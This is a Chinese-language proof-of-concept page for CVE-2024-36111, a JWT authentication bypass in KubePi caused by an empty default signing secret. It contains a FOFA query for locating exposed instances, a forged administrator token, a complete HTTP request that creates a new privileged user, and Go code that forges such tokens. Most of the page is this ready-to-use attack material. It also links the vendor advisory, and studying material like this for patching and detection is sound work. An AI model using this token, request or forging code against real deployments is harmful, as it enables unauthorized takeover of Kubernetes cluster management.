# KubePi存在JWT验证绕过漏洞(CVE-2024-36111)

kubepi jwttoken 校验存在缺陷，默认配置文件中jwt密钥为空，虽然读取配置文件相关逻辑中检测到密钥为空时，会生成一个随机32位字符串覆盖配置文件中的密钥，但是实际校验时，密钥为空，使用空密钥生成jwttoken可绕过登录校验，可直接接管后台

## fofa

```java
"kubepi"
```

## poc

![image](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407302144253.png)

使用空密钥生成jwt token 

```java
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfSwiaWF0IjoxNzE2NDQ3MDEyLCJleHAiOjE3MjI0NDcwMTJ9.dedNLwXZu0JY1sgGBCRZmpFvAnLdHjxdPmKWXA7LCf4
```

使用生成的密钥创建用户tang

```java
POST /kubepi/api/v1/users HTTP/1.1
Host: 127.0.0.1:9982
Content-Length: 248
sec-ch-ua: 
Accept: application/json, text/plain, */*
lang: zh-CN
Content-Type: application/json
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
sec-ch-ua-platform: ""
Origin: http://127.0.0.1:9982
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:9982/kubepi/user-management/users/create
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfSwiaWF0IjoxNzE2NDQ3MDEyLCJleHAiOjE3MjI0NDcwMTJ9.dedNLwXZu0JY1sgGBCRZmpFvAnLdHjxdPmKWXA7LCf4
Connection: close

{"apiVersion":"v1","kind":"User","name":"tang","roles":["Common User","Manage Image Registries","Manage Clusters","Manage RBAC"],"nickName":"tang","email":"tang@qq.com","authenticate":{"password":"12345678@Tang"},"mfa":{"enable":false,"secret":""}}
```

![image](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407302142936.png)

![image](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407302142055.png)

## 生成jwt token程序

```go
package main

import (
	"fmt"
	"github.com/kataras/iris/v12/middleware/jwt"
	"time"
)

var jwtMaxAge = 100000 * time.Minute

type UserProfile struct {
	Name                string              `json:"name"`
	NickName            string              `json:"nickName"`
	Email               string              `json:"email"`
	Language            string              `json:"language"`
	ResourcePermissions map[string][]string `json:"resourcePermissions"`
	IsAdministrator     bool                `json:"isAdministrator"`
	Mfa                 Mfa                 `json:"mfa"`
}

type Mfa struct {
	Enable   bool   `json:"enable"`
	Secret   string `json:"secret"`
	Approved bool   `json:"approved"`
}

func main() {
	jwtSigner := jwt.NewSigner(jwt.HS256, "", jwtMaxAge)
	test := map[string][]string{}
	profile := UserProfile{
		Name:                "admin",
		NickName:            "Administrator",
		Email:               "support@fit2cloud.com",
		Language:            "zh-CN",
		ResourcePermissions: test,
		IsAdministrator:     true,
		Mfa: Mfa{
			Secret:   "",
			Enable:   false,
			Approved: false,
		},
	}
	nonejwt, _ := jwtSigner.Sign(profile)
	fmt.Println(string(nonejwt))
}

```

## 漏洞来源

- https://github.com/1Panel-dev/KubePi/security/advisories/GHSA-8q5r-cvcw-4wx7